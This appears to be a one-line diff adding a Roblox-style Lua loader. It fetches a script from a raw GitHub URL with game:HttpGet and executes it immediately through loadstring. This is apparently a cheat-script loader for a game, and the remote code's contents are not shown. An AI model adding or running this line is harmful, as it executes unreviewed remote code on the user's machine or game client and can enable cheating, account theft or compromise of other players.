@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pnoiiiiiiiiiiiii/selfemade-ff2/main/ff"))()
